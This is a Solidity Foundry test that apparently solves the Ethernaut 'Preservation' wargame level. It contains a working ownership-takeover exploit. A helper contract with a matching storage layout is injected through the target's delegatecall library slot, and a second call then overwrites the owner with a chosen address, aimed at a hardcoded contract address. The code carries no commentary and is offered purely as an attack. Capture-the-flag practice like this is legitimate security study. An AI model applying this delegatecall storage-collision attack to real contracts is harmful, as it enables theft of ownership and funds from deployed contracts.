// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Preservation} from "../src/Preservation.sol";

contract PreservationTest is Test {
    address public buf;
    address public addr = 0xE78CD2063Baf5bD1aA9675e630E92a0316653aBe;
    address public owner;

    function testAttack() public {
        Preservation preservation = Preservation(addr);
        MyContract myContract = new MyContract();
        preservation.setFirstTime(uint256(uint160(address(myContract))));
        preservation.setFirstTime(uint256(uint160(0x947c5fFb05ed063d6edDc8a604AD99B3df3d599A)));
        assertEq(preservation.owner(), 0x947c5fFb05ed063d6edDc8a604AD99B3df3d599A);
    }

}

contract MyContract {
    address public buf;
    address public addr;
    address public owner;

    function setTime(uint _owner) public {
        owner = address(uint160(_owner));
    }
}
